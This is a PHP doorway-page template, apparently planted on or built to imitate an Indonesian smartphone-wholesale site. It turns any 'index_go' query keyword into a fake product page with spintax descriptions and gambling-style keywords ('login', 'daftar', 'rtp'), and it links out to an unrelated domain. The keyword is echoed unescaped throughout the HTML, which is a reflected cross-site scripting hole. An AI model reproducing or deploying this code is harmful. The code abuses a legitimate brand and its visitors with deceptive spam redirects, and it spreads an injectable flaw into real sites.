<?php
// 1. Retrieve the 'tuwaga1337' parameter or set it to an empty string
$q = isset($_GET['index_go']) ? $_GET['index_go'] : '';

// 2. If $q is empty, show a default message and exit
if (empty($q)) {
    include 'index_old.php';
    displayMessage();
}
$urlpath = str_replace(' ', '-', $q);
$BRANDS = strtoupper(str_replace('-', ' ', $q));
...
// 1. Read desc.txt line-by-line into an array
$lines = @file('desc.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

// 2. If file reading fails or the file is empty, default to no description
if (!$lines) {
    $DESCRIPTION = 'No description available.';
} else {
    // 3. Shuffle the array so lines are in a random order
    shuffle($lines);

    // 4. Slice the first N lines (e.g. 2 lines) for your short description
    //    If you want 1 line, change 2 -> 1; if you want 3 lines, change to 3, etc.
    $randomSubset = array_slice($lines, 0, 2);

    // 5. Parse spintax in each picked line
    $parsedLines = [];
    foreach ($randomSubset as $line) {
        $parsedLines[] = parseSpintax($line);
    }

    // 6. Join them with a space (or line break) to form one combined description
    $combined = implode(' ', $parsedLines);

    // 7. Escape it for safety (since it's going into HTML)
    $DESCRIPTION = htmlspecialchars($combined, ENT_QUOTES, 'UTF-8');
}
...
<head>
    ...
    <base href="">
    <meta charset="utf-8" />
    <title><?php echo $BRANDS ?> # Grosir Smartphone & Aksesori Terpercaya – Media Selular Indonesia</title>
    <meta http-equiv="Accept-CH" content="Sec-CH-UA-Platform-Version, Sec-CH-UA-Model" />
    <link rel="icon" type="https://grosir.mediaselularindonesia.com/icon/samsam.png" />
    <link rel="canonical" href="https://grosir.mediaselularindonesia.com/<?php echo $BRANDS ?>" />
    <link rel="amphtml" href="https://aisi.tupailompat.cool/grosir/?id=<?php echo $BRANDS ?>" />
    <meta property="og:site_name" content="<?php echo $BRANDS ?>" />
    <meta property="og:title" content="<?php echo $BRANDS ?> # Grosir Smartphone & Aksesori Terpercaya – Media Selular Indonesia" />
    <meta property="og:url" content="https://grosir.mediaselularindonesia.com/<?php echo $BRANDS ?>" />
    <meta property="og:type" content="product" />
    <meta property="og:description"
        content="<?php echo $BRANDS ?>&nbsp;<?php echo $DESCRIPTION ?>" />
    <meta name="Keywords"
        content="<?php echo $BRANDS ?>, login <?php echo $BRANDS ?>, daftar <?php echo $BRANDS ?>, situs <?php echo $BRANDS ?>, rtp <?php echo $BRANDS ?>, link <?php echo $BRANDS ?>, alternatif <?php echo $BRANDS ?>" />
    <meta property="og:image" content="https://i.pinimg.com/736x/02/62/31/0262318c08df29b20622978a03aa3bfc.jpg" />
    ...
    <meta itemprop="name"
        content="<?php echo $BRANDS ?> # Grosir Smartphone & Aksesori Terpercaya – Media Selular Indonesia" />
    <meta itemprop="url" content="https://grosir.mediaselularindonesia.com/<?php echo $BRANDS ?>" />
    <meta itemprop="description"
        content="<?php echo $BRANDS ?>&nbsp;<?php echo $DESCRIPTION ?>" />
    <meta itemprop="thumbnailUrl" content="https://i.pinimg.com/736x/02/62/31/0262318c08df29b20622978a03aa3bfc.jpg" />
    <link rel="image_src" href="https://i.pinimg.com/736x/02/62/31/0262318c08df29b20622978a03aa3bfc.jpg" />
    <meta itemprop="image" content="https://i.pinimg.com/736x/02/62/31/0262318c08df29b20622978a03aa3bfc.jpg" />
    <meta name="twitter:title"
        content="<?php echo $BRANDS ?> # Grosir Smartphone & Aksesori Terpercaya – Media Selular Indonesia" />
    <meta name="twitter:image" content="https://i.pinimg.com/736x/02/62/31/0262318c08df29b20622978a03aa3bfc.jpg" />
    <meta name="twitter:url" content="https://grosir.mediaselularindonesia.com/<?php echo $BRANDS ?>" />
    ...
    " data-section-theme="" data-controller="Header" data-current-styles="{&quot;layout&quot;: &quot;brandingCenter&quot;,
                                                            ...
                                                            &quot;solidOptions&quot;: {
                                                              ...
                                                              &quot;dropShadow&quot;: {
                                                                ...
                                                                &quot;color&quot;: {
                                                                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&ququot;,
                                                                  &quot;sitePaletteColor&quot;: {
                                                                    &quot;colorName&quot;: &quot;black&quot;,
                                                                    &quot;alphaModifier&quot;: 1.0
                                                                  }
                                ...
                                <div class="header-nav-wrapper">
                                    <nav class="header-nav-list">
                                        ...
                                        <div
                                            ...
                                            <a href="https://grosir.mediaselularindonesia.com/<?php echo $BRANDS ?>" data-animation-role="header-element"
                                                aria-current="page">
                                                <?php echo $BRANDS ?>                                            </a>
                                        </div>
                                    </nav>
                                ...
                                <div class="header-title-logo">
                                    <a href="https://grosir.mediaselularindonesia.com/<?php echo $BRANDS ?>" data-animation-role="header-element">
                                        ...
                                        <img elementtiming="nbf-header-logo-desktop"
                                            src="https://grosir.mediaselularindonesia.com/icon/samsam.png"
                                            alt="<?php echo $BRANDS ?>" style="display:block" fetchpriority="high" loading="eager"
...
" data-animation-role="header-element">
                            ...
                            <div class="header-menu-nav-folder-content">
                                ...
                                <div class="header-menu-nav-wrapper">
                                    ...
                                    <div
                                        ...
                                        <a href="https://grosir.mediaselularindonesia.com/<?php echo $BRANDS ?>" aria-current="page">
    ...
    ">
                        ...
                        <div class="content">
                            <div class="n-columns-2">
                                <a href="https://aisi.tupailompat.cool/grosir/?id=<?php echo $BRANDS ?>"
                                ...
                                <article
                                    ...
                                    <nav class="ProductItem-nav">
                                        <div class="ProductItem-nav-breadcrumb" data-animation-role="content">
                                            <a href="https://grosir.mediaselularindonesia.com/<?php echo $BRANDS ?>"
                                                class="ProductItem-nav-breadcrumb-link"><?php echo $BRANDS ?></a>
                                    ...
                                    <section class="ProductItem-summary" data-controller="ProductGallery">
                                        <section aria-label="Gallery" class="ProductItem-gallery"
                                            data-product-gallery="container"><div class="ProductItem-gallery-slides" data-animation-role="image"
                                                ...
                                                <div class="ProductItem-gallery-slides-item" data-slide-index="1"
                                                    ...
                                                    <img aria-describedby="ProductItem-gallery-slides-item-1-index-65fd0fd62438744c9a05c86b"
                                                        ...
                                                        data-src="https://i.pinimg.com/736x/02/62/31/0262318c08df29b20622978a03aa3bfc.jpg"
                                                        data-image="https://i.pinimg.com/736x/02/62/31/0262318c08df29b20622978a03aa3bfc.jpg"
                                                        data-image-dimensions="1024x1024"
                                                        data-image-focal-point="0.5,0.5" alt="<?php echo $BRANDS ?>"
                                                        ...
                                                        <div class="gallery-lightbox-wrapper">
                                                                    ...
                                                                    <div class="gallery-lightbox-item-wrapper">
                                                                        <div class="gallery-lightbox-item-src">
                                                                            <div
                                                                                ...
                                                                                <img data-src="https://i.pinimg.com/736x/02/62/31/0262318c08df29b20622978a03aa3bfc.jpg"
                                                                                    data-image="https://i.pinimg.com/736x/02/62/31/0262318c08df29b20622978a03aa3bfc.jpg"
                                                                                    data-image-dimensions="1024x1024"
                                                                                    data-image-focal-point="0.5,0.5"
                                                                                    alt="<?php echo $BRANDS ?>" data-load="false"
                                                            ...
                                                            <div class="gallery-lightbox-controls"
                                                                ...
                                                                <div class="gallery-lightbox-control" data-next
                                                                    ...
                                                                    <button class="gallery-lightbox-control-btn"
                                                                        aria-label="Next Slide"><div class="gallery-lightbox-control-btn-icon">
  ...
  " data-test="pdp-details">
                                            ...
                                            <h1 class="ProductItem-details-title" data-content-field="title"
                                                data-test="pdp-title">
                                                <?php echo $BRANDS ?> # Grosir Smartphone & Aksesori Terpercaya – Media Selular Indonesia</h1>
                                            <div data-controller="ProductItemVariants,ProductCartButton"
                                                ...
                                                <div class="ProductItem-details-excerpt" data-content-field="excerpt">
                                                    <p><a href="https://grosir.mediaselularindonesia.com/<?php echo $BRANDS ?>"><span style="color: #0f1d86;"><strong><?php echo $BRANDS ?></strong></span></a>&nbsp;<?php echo $DESCRIPTION ?></p>
                                            ...
                                            <div class="sqs-add-to-cart-button-wrapper" data-animation-role="button">
                                                <div class="sqs-add-to-cart-button sqs-suppress-edit-mode sqs-editable-button sqs-button-element--primary "
                                                    ...
                                                    data-use-custom-label="false" data-original-label="<?php echo $BRANDS ?>">
    ...
    <footer class="sections" id="footer-sections" data-footer-sections>
        ...
        <small class="copyright__content">POWERED BY <a target="_blank" rel="sponsored"
                href="https://grosir.mediaselularindonesia.com/<?php echo $BRANDS ?>"><?php echo $BRANDS ?></a></small>
    </footer>
